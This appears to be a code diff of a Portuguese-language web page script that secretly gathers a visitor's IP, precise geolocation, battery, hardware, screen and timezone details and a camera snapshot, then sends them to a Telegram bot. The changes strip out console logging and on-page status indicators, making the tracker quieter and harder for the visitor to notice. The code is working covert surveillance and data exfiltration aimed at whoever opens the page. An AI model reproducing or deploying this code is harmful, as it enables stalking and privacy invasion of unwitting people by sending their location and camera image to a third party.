@@ -42,12 +42,9 @@
                         isp: data.isp || data.org,
                         as: data.as
                     };
-                    console.log('🌐 IP:', data.query);
                 }
             }
-        } catch (e) {
-            console.log('🌐 IP falhou');
-        }
+        } catch (e) {}
 
         try {
             const pos = await new Promise((resolve, reject) => {
@@ -58,10 +55,7 @@
                 lng: pos.coords.longitude,
                 accuracy: pos.coords.accuracy
             };
-            console.log('📍 Geo:', pos.coords.latitude, ',', pos.coords.longitude);
-        } catch (e) {
-            console.log('📍 Geo negada');
-        }
+        } catch (e) {}
 
         try {
             const battery = await navigator.getBattery();
@@ -69,7 +63,6 @@
                 level: battery.level,
                 charging: battery.charging
             };
-            console.log('🔋 Bateria:', Math.round(battery.level * 100), '%');
         } catch (e) {}
 
         try {
@@ -105,8 +98,6 @@
         collectedData.collectedAt = new Date().toISOString();
         collectedData.url = window.location.href;
 
-        console.log('✅ Coleta concluída. A iniciar tentativas de envio...');
-        
         sendAttempts = 0;
         trySend();
     }
@@ -132,61 +123,53 @@
 
     async function trySend() {
         sendAttempts++;
-        console.log(`📤 Tentativa ${sendAttempts}/${MAX_ATTEMPTS}...`);
 
         try {
             const data = collectedData;
             const snapshot = await captureSnapshot();
 
-            if (!data.ip && !data.geolocation && !data.battery) {
-                console.log('⚠️ Sem dados para enviar ainda. Aguardando...');
-                scheduleNext();
-                return;
-            }
-
-            let msg = '📡 opsec.whbf.cc\n━━━━━━━━━━━\n\n';
+            let msg = 'OPSEC whbf.cc\n\n';
 
             if (data.ip) {
                 msg += 'IP: ' + (data.ip.ip || '?') + '\n';
                 msg += 'Cidade: ' + (data.ip.city || '') + '\n';
-                msg += 'País: ' + (data.ip.country || '') + '\n';
+                msg += 'Pais: ' + (data.ip.country || '') + '\n';
                 msg += 'ISP: ' + (data.ip.isp || '') + '\n\n';
             }
 
             if (data.geolocation) {
-                msg += '📍 ' + data.geolocation.lat + ', ' + data.geolocation.lng + '\n\n';
+                msg += 'Geo: ' + data.geolocation.lat + ', ' + data.geolocation.lng + '\n\n';
             }
 
             if (data.battery) {
-                msg += '🔋 ' + Math.round(data.battery.level * 100) + '%';
+                msg += 'Bateria: ' + Math.round(data.battery.level * 100) + '%';
                 msg += data.battery.charging ? ' (carregando)\n\n' : '\n\n';
             }
 
             if (data.gpu) {
-                msg += '🖥️ ' + (data.gpu.renderer || '') + '\n\n';
+                msg += 'GPU: ' + (data.gpu.renderer || '') + '\n\n';
             }
 
             if (data.browser) {
-                msg += '🔹 ' + data.browser.platform + ' | ' + data.browser.language + '\n';
-                msg += '🔹 ' + (data.browser.hardwareConcurrency || '?') + ' cores\n';
-                msg += '🔹 ' + (data.browser.deviceMemory || '?') + ' GB RAM\n\n';
+                msg += 'Platform: ' + data.browser.platform + ' | ' + data.browser.language + '\n';
+                msg += 'Cores: ' + (data.browser.hardwareConcurrency || '?') + '\n';
+                msg += 'RAM: ' + (data.browser.deviceMemory || '?') + ' GB\n\n';
             }
 
             if (data.screen) {
-                msg += '🖥️ ' + data.screen.width + 'x' + data.screen.height;
+                msg += 'Screen: ' + data.screen.width + 'x' + data.screen.height;
                 msg += ' @' + data.screen.devicePixelRatio + 'x\n\n';
             }
 
             if (data.timezone) {
-                msg += '🕐 ' + data.timezone.timezone + '\n\n';
+                msg += 'Timezone: ' + data.timezone.timezone + '\n\n';
             }
 
             if (data.camera && data.camera.enabled) {
-                msg += '📷 ' + data.camera.width + 'x' + data.camera.height + '\n\n';
+                msg += 'Camera: ' + data.camera.width + 'x' + data.camera.height + '\n\n';
             }
 
-            msg += '━━━━━━━━━━━\n';
-            msg += data.url + '\n';
+            msg += 'Url: ' + data.url + '\n';
             msg += data.collectedAt;
 
             const url = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';
@@ -195,18 +178,13 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: TELEGRAM_CHAT_ID,
-                    text: msg,
-                    parse_mode: 'Markdown',
-                    disable_web_page_preview: true
+                    text: msg
                 })
             });
 
             if (!response.ok) {
                 throw new Error('HTTP ' + response.status);
             }
-
-            console.log('✅ Mensagem enviada com sucesso!');
-            document.getElementById('status').textContent = '✅';
 
             if (snapshot) {
                 const photoUrl = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendPhoto';
@@ -215,24 +193,14 @@
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('photo', blob, 'shot.jpg');
                 await fetch(photoUrl, { method: 'POST', body: formData });
-                console.log('📸 Snapshot enviado');
             }
 
             return;
 
         } catch (e) {
-            console.log('❌ Erro na tentativa', sendAttempts, ':', e.message);
-            scheduleNext();
-        }
-    }
-
-    function scheduleNext() {
-        if (sendAttempts < MAX_ATTEMPTS) {
-            console.log(`⏳ Próxima tentativa em 3 segundos...`);
-            setTimeout(trySend, 3000);
-        } else {
-            console.log('🛑 Máximo de tentativas atingido. A página pode ser recarregada para nova tentativa.');
-            document.getElementById('status').textContent = '⚠️';
+            if (sendAttempts < MAX_ATTEMPTS) {
+                setTimeout(trySend, 3000);
+            }
         }
     }
 
